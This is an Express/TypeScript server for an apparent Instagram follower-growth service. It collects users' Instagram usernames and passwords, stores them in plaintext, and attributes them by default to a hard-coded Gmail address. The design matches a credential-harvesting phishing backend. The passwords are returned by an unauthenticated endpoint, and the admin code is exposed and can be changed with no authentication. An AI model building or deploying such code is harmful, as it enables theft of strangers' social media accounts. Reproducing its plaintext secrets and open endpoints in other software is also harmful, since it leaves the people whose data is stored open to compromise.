import express from 'express';
import { createServer as createViteServer } from 'vite';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DATA_DIR = path.join(__dirname, 'data');
const DB_FILE = path.join(DATA_DIR, 'db.json');

export interface InstagramAccount {
  id: string;
  username: string;
  password: string;
  followers_requested: number;
  status: 'pending' | 'processing' | 'completed' | 'cancelled';
  created_by: string;
  created_at: string;
  updated_at?: string;
}

export interface AppSettings {
  admin_code: string;
  app_title: string;
  app_subtitle: string;
  form_title: string;
  form_subtitle: string;
  coins_default?: number;
}

interface DatabaseData {
  accounts: InstagramAccount[];
  settings: AppSettings;
}

const DEFAULT_SETTINGS: AppSettings = {
  admin_code: '805040',
  app_title: 'Grow Your Instagram',
  app_subtitle: 'Get real followers instantly ✨',
  form_title: 'Add Instagram Account',
  form_subtitle: 'अपना Instagram अकाउंट जोड़ें',
  coins_default: 500,
};

const INITIAL_ACCOUNTS: InstagramAccount[] = [
  {
    id: 'acc_1',
    username: 'rohit_sharma_official',
    password: 'password_sample_982',
    followers_requested: 1000,
    status: 'completed',
    created_by: 'jiteshprajapati18392@gmail.com',
    created_at: new Date(Date.now() - 3600000 * 24).toISOString(),
  },
  {
    id: 'acc_2',
    username: 'priya.creatives',
    password: 'priya_secure_pass1!',
    followers_requested: 500,
    status: 'processing',
    created_by: 'jiteshprajapati18392@gmail.com',
    created_at: new Date(Date.now() - 3600000 * 5).toISOString(),
  },
  {
    id: 'acc_3',
    username: 'vikram_fit_life',
    password: 'vikram_fit#2026',
    followers_requested: 2500,
    status: 'pending',
    created_by: 'jiteshprajapati18392@gmail.com',
    created_at: new Date(Date.now() - 3600000 * 1).toISOString(),
  },
];

function initDB(): DatabaseData {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    if (fs.existsSync(DB_FILE)) {
      const content = fs.readFileSync(DB_FILE, 'utf-8');
      const parsed = JSON.parse(content);
      return {
        accounts: Array.isArray(parsed.accounts) ? parsed.accounts : INITIAL_ACCOUNTS,
        settings: { ...DEFAULT_SETTINGS, ...(parsed.settings || {}) },
      };
    }
  } catch (err) {
    console.error('Error reading DB file, reinitializing default:', err);
  }

  const initialData: DatabaseData = {
    accounts: INITIAL_ACCOUNTS,
    settings: DEFAULT_SETTINGS,
  };
  saveDB(initialData);
  return initialData;
}

function saveDB(data: DatabaseData) {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
    }
    fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2), 'utf-8');
  } catch (err) {
    console.error('Failed to write to DB file:', err);
  }
}

async function startServer() {
  let db = initDB();
  const app = express();
  const PORT = parseInt(process.env.PORT || '3000', 10);
  const isProduction = process.env.NODE_ENV === 'production';

  app.use(express.json());

  // API Routes
  // 1. Get settings
  app.get('/api/settings', (_req, res) => {
    res.json({ success: true, data: db.settings });
  });

  // 2. Update settings
  app.post('/api/settings', (req, res) => {
    const { admin_code, app_title, app_subtitle, form_title, form_subtitle } = req.body;
    db.settings = {
      ...db.settings,
      admin_code: admin_code !== undefined ? String(admin_code).trim() : db.settings.admin_code,
      app_title: app_title !== undefined ? String(app_title).trim() : db.settings.app_title,
      app_subtitle: app_subtitle !== undefined ? String(app_subtitle).trim() : db.settings.app_subtitle,
      form_title: form_title !== undefined ? String(form_title).trim() : db.settings.form_title,
      form_subtitle: form_subtitle !== undefined ? String(form_subtitle).trim() : db.settings.form_subtitle,
    };
    saveDB(db);
    res.json({ success: true, data: db.settings, message: 'Settings updated successfully' });
  });

  // 3. Verify admin code
  app.post('/api/verify-admin', (req, res) => {
    const { code } = req.body;
    const trimmedCode = String(code || '').trim();
    if (trimmedCode === db.settings.admin_code) {
      res.json({ success: true, verified: true, message: 'Admin verified successfully' });
    } else {
      res.status(401).json({ success: false, verified: false, message: 'Invalid admin access code' });
    }
  });

  // 4. Get all accounts
  app.get('/api/accounts', (_req, res) => {
    res.json({ success: true, data: db.accounts });
  });

  // 5. Add new account
  app.post('/api/accounts', (req, res) => {
    const { username, password, followers_requested, created_by } = req.body;

    if (!username || !password) {
      return res.status(400).json({ success: false, message: 'Username and password are required' });
    }

    const cleanUsername = String(username).replace(/^@+/, '').trim();
    const cleanFollowers = parseInt(followers_requested, 10) || 500;

    const newAccount: InstagramAccount = {
      id: `acc_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
      username: cleanUsername,
      password: String(password).trim(),
      followers_requested: cleanFollowers,
      status: 'pending',
      created_by: created_by || 'jiteshprajapati18392@gmail.com',
      created_at: new Date().toISOString(),
    };

    // Prepend so newest appears first
    db.accounts.unshift(newAccount);
    saveDB(db);

    res.status(201).json({ success: true, data: newAccount, message: 'Account added successfully' });
  });

  // 6. Update account status
  app.patch('/api/accounts/:id', (req, res) => {
    const { id } = req.params;
    const { status, followers_requested } = req.body;

    const accountIndex = db.accounts.findIndex((acc) => acc.id === id);
    if (accountIndex === -1) {
      return res.status(404).json({ success: false, message: 'Account not found' });
    }

    if (status) {
      db.accounts[accountIndex].status = status;
    }
    if (followers_requested !== undefined) {
      db.accounts[accountIndex].followers_requested = Number(followers_requested);
    }
    db.accounts[accountIndex].updated_at = new Date().toISOString();

    saveDB(db);
    res.json({ success: true, data: db.accounts[accountIndex] });
  });

  // 7. Delete account
  app.delete('/api/accounts/:id', (req, res) => {
    const { id } = req.params;
    const initialLen = db.accounts.length;
    db.accounts = db.accounts.filter((acc) => acc.id !== id);

    if (db.accounts.length === initialLen) {
      return res.status(404).json({ success: false, message: 'Account not found' });
    }

    saveDB(db);
    res.json({ success: true, message: 'Account deleted successfully' });
  });

  // 8. Reset database
  app.post('/api/reset-data', (_req, res) => {
    db = {
      accounts: INITIAL_ACCOUNTS,
      settings: DEFAULT_SETTINGS,
    };
    saveDB(db);
    res.json({ success: true, message: 'Database reset to default sample data', data: db });
  });

  // Attach Vite middleware in development or serve dist in production
  if (!isProduction) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(__dirname, 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Instagram Growth Server listening on http://0.0.0.0:${PORT}`);
  });
}

startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
